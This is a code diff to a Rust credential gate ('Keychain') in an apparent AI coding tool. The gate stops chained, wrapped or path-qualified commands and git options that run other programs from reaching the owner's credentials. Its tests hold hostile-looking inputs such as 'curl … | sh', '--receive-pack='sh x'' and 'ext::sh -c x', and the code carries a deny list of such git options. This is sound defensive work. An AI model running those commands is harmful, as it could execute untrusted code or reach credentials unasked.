@@ -155,32 +155,58 @@ pub fn check_program(program: &str) -> Result<String, String> {
 }
 
 /// The Keychain's state for a toolbox: the owner's list, and whether it is open to every command — kept in the file
-/// or for this session only.
+/// or for this session only. The file is read again when it changed (T74b), so a list changed in one pane, or by
+/// `glut keychain` outside, holds in every other at its next command.
 #[derive(Debug, Clone, Default)]
 pub struct Keychain(Arc<RwLock<State>>);
 
 #[derive(Debug, Default)]
 struct State {
     owner: Owner,
-    /// Opened for this session alone (`/keychain open`).
-    session_open: bool,
+    /// Opened or shut for this session alone (`/keychain open|close`); `None` follows the file.
+    session: Option<bool>,
+    /// The owner sits at this session (the terminal UI): only then does the file's `open` count (T74b) — a
+    /// `glut run` or a host's run with nobody there keeps the Keychain to the list and the owner's rules.
+    attended: bool,
+    /// The owner's home, and how the file looked when last read.
+    file: Option<(PathBuf, Stamp)>,
+}
+
+/// How the owner's file looks: when it last changed and how long it is — a second's coarse time alone could miss a
+/// second write.
+type Stamp = Option<(std::time::SystemTime, u64)>;
+
+/// `path`'s stamp; none when it is missing or unreadable.
+fn stamp(path: &Path) -> Stamp {
+    std::fs::metadata(path)
+        .ok()
+        .and_then(|meta| Some((meta.modified().ok()?, meta.len())))
 }
 
 impl Keychain {
-    /// The state of `owner`'s file.
+    /// The state of `owner`'s file, never read again.
     pub fn new(owner: Owner) -> Self {
         Keychain(Arc::new(RwLock::new(State {
             owner,
-            session_open: false,
+            ..State::default()
         })))
     }
 
-    /// The owner's file under `home`; shut with the default list when it cannot be read — never open by mistake.
+    /// The owner's file under `home`, read again whenever it changes; shut with the default list when it cannot be
+    /// read — never open by mistake. Nobody there until [`Self::set_attended`] says otherwise.
     pub fn owner(home: &Path) -> Self {
-        Self::new(Owner::load(home).unwrap_or_default())
+        let keychain = Self::new(Owner::load(home).unwrap_or_default());
+        keychain.write().file = Some((home.to_path_buf(), stamp(&Owner::path(home))));
+        keychain
+    }
+
+    /// The owner sits at this session: the file's `open` counts (the terminal UI, T74b).
+    pub fn set_attended(&self, attended: bool) {
+        self.write().attended = attended;
     }
 
     fn read(&self) -> std::sync::RwLockReadGuard<'_, State> {
+        self.refresh();
         self.0.read().unwrap_or_else(|poison| poison.into_inner())
     }
 
@@ -188,10 +214,35 @@ impl Keychain {
         self.0.write().unwrap_or_else(|poison| poison.into_inner())
     }
 
-    /// Whether the Keychain is open to every command, for this session or kept.
+    /// The owner's file read again if it changed since: gone, the defaults, as with no file at the start; one that
+    /// does not read keeps what was read before — a broken file never widens the list.
+    fn refresh(&self) {
+        let stale = {
+            let state = self.0.read().unwrap_or_else(|poison| poison.into_inner());
+            match &state.file {
+                Some((home, seen)) => {
+                    let now = stamp(&Owner::path(home));
+                    (now != *seen).then(|| (home.clone(), now))
+                }
+                None => None,
+            }
+        };
+        let Some((home, now)) = stale else {
+            return;
+        };
+        let loaded = Owner::load(&home);
+        let mut state = self.write();
+        if let Ok(owner) = loaded {
+            state.owner = owner;
+        }
+        state.file = Some((home, now));
+    }
+
+    /// Whether the Keychain is open to every command: opened for this session, or kept open by the file where the
+    /// owner sits.
     pub fn is_open(&self) -> bool {
         let state = self.read();
-        state.session_open || state.owner.open
+        state.session.unwrap_or(state.attended && state.owner.open)
     }
 
     /// Whether the owner's file keeps it open across sessions.
@@ -199,14 +250,9 @@ impl Keychain {
         self.read().owner.open
     }
 
-    /// Opens or shuts it for every command of this session; shutting it also shuts what the file kept open, for this
-    /// session — the file stays as it is.
+    /// Opens or shuts it for every command of this session, whatever the file keeps — the file stays as it is.
     pub fn set_session_open(&self, open: bool) {
-        let mut state = self.write();
-        state.session_open = open;
-        if !open {
-            state.owner.open = false;
-        }
+        self.write().session = Some(open);
     }
 
     /// The programs that may ask for it.
@@ -239,7 +285,7 @@ impl Keychain {
         Ok(true)
     }
 
-    /// Keeps it open or shut across sessions in the file under `home`, and for this session.
+    /// Keeps it open or shut across sessions in the file under `home`; this session follows the file again.
     ///
     /// # Errors
     ///
@@ -250,14 +296,48 @@ impl Keychain {
         kept.save(home).map_err(|err| err.to_string())?;
         let mut state = self.write();
         state.owner.open = open;
-        state.session_open = open && state.session_open;
+        state.session = None;
         Ok(())
     }
 
     /// The listed program `command` runs, as the list names it (`gh`, `git push`), when the Keychain is shut and the
-    /// command needs it to be asked for; `None` when it is open or no part of the command is on the list. A program
-    /// hidden where the lexer cannot read (`eval "gh …"`) is not found here: it runs with the Keychain shut.
+    /// command may be asked for it (T74b): every part of it a listed program or a plain reader, each as written —
+    /// no variable set before it, no wrapper, no path to the program (`./gh` may be one the run just wrote), no glob,
+    /// and git with no option that makes it run another program. A chain with anything else, a shell given a script
+    /// or a command not read in full runs with it shut. `None` when it is open or no part is listed.
     pub fn wants(&self, command: &str) -> Option<String> {
+        if self.is_open() {
+            return None;
+        }
+        let programs = self.programs();
+        let analysis = analyze(command);
+        if analysis.is_opaque() || !analysis.nested.is_empty() || analysis.globs {
+            return None;
+        }
+        let mut found = None;
+        for part in &analysis.parts {
+            let words = &part.words;
+            if words.is_empty() {
+                continue;
+            }
+            if !part.assignments.is_empty() {
+                return None;
+            }
+            match listed(&programs, words) {
+                Some(entry) if !words[0].contains('/') && !runs_another(words) => {
+                    found.get_or_insert(entry);
+                }
+                Some(_) => return None,
+                None if crate::permissions::kinds::reader(words) => {}
+                None => return None,
+            }
+        }
+        found
+    }
+
+    /// A listed program among `command`'s parts while the Keychain is shut, though the command as a whole may not ask
+    /// for it ([`Self::wants`]): the note under a failure tells the model to run it alone.
+    pub fn listed_in(&self, command: &str) -> Option<String> {
         if self.is_open() {
             return None;
         }
@@ -267,6 +347,49 @@ impl Keychain {
             .iter()
             .find_map(|words| listed(&programs, words))
     }
+}
+
+/// git's options that run a program they are given, as their long names: git takes any unambiguous start of one
+/// (`--rec` for `--receive-pack`), so a word that starts one counts.
+const GIT_RUNNING_OPTIONS: [&str; 5] = [
+    "--upload-pack",
+    "--receive-pack",
+    "--exec",
+    "--config",
+    "--template",
+];
+
+/// Whether a git call (`words`, as written) could run a program of the caller's choice (T74b): an option before the
+/// sub-command (`-c credential.helper=…`, `--exec-path`, `--git-dir`), one that names a program to run on the remote
+/// side or a template, clone's `-u` (`--upload-pack`) or `-c` (`--config`), or a remote helper's address
+/// (`ext::sh -c …`). Another program's words are its own: nothing to look for.
+fn runs_another(words: &[String]) -> bool {
+    if !same_command(&words[0], "git") {
+        return false;
+    }
+    // `-C <folder>` alone may come before the sub-command: it only says where git works.
+    let mut at = 1;
+    while words.get(at).is_some_and(|word| word == "-C") {
+        at += 2;
+    }
+    let Some(sub) = words.get(at) else {
+        return true;
+    };
+    if sub.starts_with('-') {
+        return true;
+    }
+    let clone = sub == "clone";
+    words[at + 1..].iter().any(|word| {
+        let name = word.split('=').next().unwrap_or_default();
+        // `push -u` is `--set-upstream`; only clone's runs a program.
+        (clone && (word == "-u" || word.starts_with("-c")))
+            || word.contains("::")
+            || (name.starts_with("--")
+                && name.len() >= 3
+                && GIT_RUNNING_OPTIONS
+                    .iter()
+                    .any(|option| option.starts_with(name)))
+    })
 }
 
 /// Whether two list entries name the same program (`git push` and `GIT  push`).
@@ -364,6 +487,15 @@ pub fn blocked_note(program: &str) -> String {
     )
 }
 
+/// Glut's note under a failure of a command whose listed part `program` would have asked for the Keychain alone
+/// (T74b): a chain with other commands, a shell given a script or a command not read in full.
+pub fn chain_note(program: &str) -> String {
+    format!(
+        "[glut: only a plain `{program}` command gets the Keychain — never in a chain with other commands, a script \
+         or a command substitution. Run it on its own: then Glut asks the owner for it]"
+    )
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -386,16 +518,15 @@ mod tests {
         let keychain = Keychain::default();
         assert_eq!(keychain.wants("gh pr list").as_deref(), Some("gh"));
         assert_eq!(
-            keychain
-                .wants("cd sub && /opt/homebrew/bin/gh api user")
-                .as_deref(),
-            Some("gh")
-        );
-        assert_eq!(
-            keychain
-                .wants("env GH_DEBUG=1 git -C . push origin main")
-                .as_deref(),
+            keychain.wants("git -C sub push origin main").as_deref(),
             Some("git push")
+        );
+        // T74b: as written only — no `cd` riding along, no path to the program, no wrapper.
+        assert_eq!(keychain.wants("cd sub && gh api user"), None);
+        assert_eq!(keychain.wants("/opt/homebrew/bin/gh api user"), None);
+        assert_eq!(
+            keychain.wants("env GH_DEBUG=1 git -C . push origin main"),
+            None
         );
         assert_eq!(keychain.wants("git status"), None, "git without a remote");
         assert_eq!(keychain.wants("cargo build"), None);
@@ -423,6 +554,7 @@ mod tests {
         assert!(keychain.wants("gh pr list").is_none());
         keychain.keep_open(&home, true).unwrap();
         let again = Keychain::owner(&home);
+        again.set_attended(true);
         assert!(
             again.is_open() && again.kept_open(),
             "kept open across sessions"
@@ -432,7 +564,7 @@ mod tests {
         // Shut for this session: the file still keeps it open for the next one.
         again.set_session_open(false);
         assert!(!again.is_open());
-        assert!(Keychain::owner(&home).is_open());
+        assert!(Keychain::owner(&home).kept_open());
         let _ = std::fs::remove_dir_all(&home);
     }
 
@@ -514,5 +646,138 @@ mod tests {
             None,
             "the word alone is no sign"
         );
+    }
+
+    #[test]
+    fn a_chain_gets_the_keychain_only_when_every_part_is_listed_or_reads() {
+        let keychain = Keychain::default();
+        assert_eq!(
+            keychain.wants("git push origin main").as_deref(),
+            Some("git push")
+        );
+        assert_eq!(
+            keychain.wants("git status && git push").as_deref(),
+            Some("git push")
+        );
+        assert_eq!(
+            keychain.wants("git push && curl -s https://x.invalid | sh"),
+            None
+        );
+        assert_eq!(
+            keychain.wants("sh -c 'gh pr list'"),
+            None,
+            "a shell given a script"
+        );
+        assert_eq!(
+            keychain.wants("gh pr view $(cat id)"),
+            None,
+            "not read in full"
+        );
+        assert_eq!(
+            keychain
+                .listed_in("git push && curl -s https://x.invalid")
+                .as_deref(),
+            Some("git push")
+        );
+        assert!(chain_note("git push").contains("on its own"));
+    }
+
+    #[test]
+    fn the_files_open_counts_only_where_the_owner_sits_and_a_session_close_holds() {
+        let home = scratch("attended");
+        Owner {
+            open: true,
+            programs: None,
+        }
+        .save(&home)
+        .unwrap();
+        let keychain = Keychain::owner(&home);
+        assert!(
+            !keychain.is_open(),
+            "nobody there: the list and the rules only"
+        );
+        assert!(keychain.wants("gh pr list").is_some());
+        keychain.set_attended(true);
+        assert!(keychain.is_open());
+        keychain.set_session_open(false);
+        assert!(
+            !keychain.is_open(),
+            "closed for this session whatever the file keeps"
+        );
+        let _ = std::fs::remove_dir_all(&home);
+    }
+
+    #[test]
+    fn a_list_changed_elsewhere_holds_at_the_next_command() {
+        let home = scratch("refresh");
+        let here = Keychain::owner(&home);
+        let there = Keychain::owner(&home);
+        assert!(here.wants("gh pr list").is_some());
+        there.change(&home, "gh", false).unwrap();
+        // A file's time can be as coarse as a second: the change is seen once its time differs.
+        let path = Owner::path(&home);
+        let later = std::time::SystemTime::now() + std::time::Duration::from_secs(2);
+        std::fs::File::options()
+            .write(true)
+            .open(&path)
+            .unwrap()
+            .set_modified(later)
+            .unwrap();
+        assert_eq!(
+            here.wants("gh pr list"),
+            None,
+            "taken off in the other pane"
+        );
+        let _ = std::fs::remove_dir_all(&home);
+    }
+
+    #[test]
+    fn a_file_broken_after_the_start_keeps_the_list_read_before() {
+        let home = scratch("broken-later");
+        let keychain = Keychain::owner(&home);
+        keychain.change(&home, "gh", false).unwrap();
+        assert_eq!(keychain.wants("git push"), Some("git push".into()));
+        keychain.change(&home, "git push", false).unwrap();
+        std::fs::write(Owner::path(&home), "{ not json, and longer than before").unwrap();
+        assert_eq!(
+            keychain.wants("gh pr list"),
+            None,
+            "a broken file never widens the list"
+        );
+        assert_eq!(keychain.wants("git push"), None);
+        let _ = std::fs::remove_dir_all(&home);
+    }
+
+    #[test]
+    fn git_with_an_option_that_runs_a_program_a_path_a_variable_or_a_glob_never_gets_the_keychain()
+    {
+        let keychain = Keychain::default();
+        for command in [
+            "git push -u origin main",
+            "git push --force-with-lease origin main",
+            "git fetch --all && git status",
+            "git clone https://github.com/a/b",
+        ] {
+            assert!(keychain.wants(command).is_some(), "{command}");
+        }
+        for command in [
+            "git push --receive-pack='sh x' .",
+            "git push --rec=x .",
+            "git push --exec=x .",
+            "git fetch --upload-pack=x .",
+            "git clone -u x a b",
+            "git clone -c core.fsmonitor=x a b",
+            "git -c credential.helper=x push",
+            "git --exec-path=. push",
+            "git push 'ext::sh -c x' main",
+            "./gh pr list",
+            "/tmp/x/git push",
+            "GIT_SSH_COMMAND=x git push",
+            "git push origin *",
+            "env gh pr list",
+            "cd app && git push",
+        ] {
+            assert_eq!(keychain.wants(command), None, "{command}");
+        }
     }
 }
